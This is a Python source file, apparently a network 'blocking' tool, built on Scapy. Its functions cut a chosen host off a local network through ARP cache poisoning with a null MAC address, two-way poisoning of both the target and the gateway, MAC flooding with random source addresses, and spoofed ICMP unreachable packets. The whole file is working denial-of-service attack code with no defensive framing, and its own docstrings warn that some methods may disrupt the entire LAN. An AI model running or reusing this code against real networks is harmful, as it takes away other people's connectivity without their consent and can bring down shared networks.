import time
from scapy.all import ARP, send, sendp, IP, ICMP, RandMAC

def get_gateway_ip(network):
    """
    Returns the gateway IP address for a given network.
    The gateway is assumed to be the first usable IP in the network (network_address + 1).
    """
    return str(network.network_address + 1)

def block_via_arp_poison(target_ip, network, block_duration=60, interval=2):
    """
    Blocks a target IP by sending ARP responses that poison the target's ARP cache.
    This method sends ARP responses claiming the gateway's IP is associated with a non-existent MAC.
    """
    gateway_ip = get_gateway_ip(network)
    arp_resp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
    print(f"Blocking {target_ip} with ARP Poisoning for {block_duration} seconds...")
    end_time = time.time() + block_duration
    while time.time() < end_time:
        send(arp_resp, verbose=False)
        time.sleep(interval)
    print(f"Finished blocking {target_ip} via ARP Poisoning.")

def block_via_arp_flood(target_ip, network, block_duration=60, interval=1):
    """
    Blocks a target IP by flooding it with ARP responses.
    Similar to ARP poisoning but with a higher frequency of packets.
    """
    gateway_ip = get_gateway_ip(network)
    arp_resp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
    print(f"Blocking {target_ip} with ARP Flooding for {block_duration} seconds...")
    end_time = time.time() + block_duration
    while time.time() < end_time:
        send(arp_resp, verbose=False)
        time.sleep(interval)
    print(f"Finished blocking {target_ip} via ARP Flooding.")

def block_via_arp_tornado(target_ip, network, block_duration=60, interval=2):
    """
    Blocks a target IP by poisoning both the target's and gateway's ARP caches simultaneously.
    This creates a bidirectional block but is more aggressive and potentially unstable.
    """
    gateway_ip = get_gateway_ip(network)
    arp_to_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
    arp_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc="00:00:00:00:00:00")
    print(f"Blocking {target_ip} with ARP Tornado for {block_duration} seconds (unstable method)!")
    end_time = time.time() + block_duration
    while time.time() < end_time:
        send(arp_to_target, verbose=False)
        send(arp_to_gateway, verbose=False)
        time.sleep(interval)
    print(f"Finished blocking {target_ip} via ARP Tornado.")

def block_via_mac_flood(target_ip, network, block_duration=60, interval=0.1):
    """
    Experimental method: Flood the network with Ethernet frames having random source MACs.
    WARNING: This method is highly unstable and likely to affect the entire LAN.
    """
    from scapy.all import sendp, RandMAC, Ether
    print(f"Blocking {target_ip} with MAC Flooding for {block_duration} seconds (unstable method)!")
    end_time = time.time() + block_duration
    while time.time() < end_time:
        # Generate a frame with a random source MAC; broadcast destination.
        frame = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
        sendp(frame, verbose=False)
        time.sleep(interval)
    print(f"Finished blocking {target_ip} via MAC Flooding.")

def block_via_icmp_unreachable(target_ip, network, block_duration=60, interval=1):
    """
    Experimental method: Send continuous spoofed ICMP Destination Unreachable messages
    to the target. WARNING: This method may have limited effect and is unstable.
    """
    from scapy.all import IP, ICMP, send
    gateway_ip = get_gateway_ip(network)
    pkt = IP(dst=target_ip, src=gateway_ip) / ICMP(type=3, code=1)
    print(f"Blocking {target_ip} with ICMP Unreachable messages for {block_duration} seconds (unstable method)!")
    end_time = time.time() + block_duration
    while time.time() < end_time:
        send(pkt, verbose=False)
        time.sleep(interval)
    print(f"Finished blocking {target_ip} via ICMP Unreachable messages.")
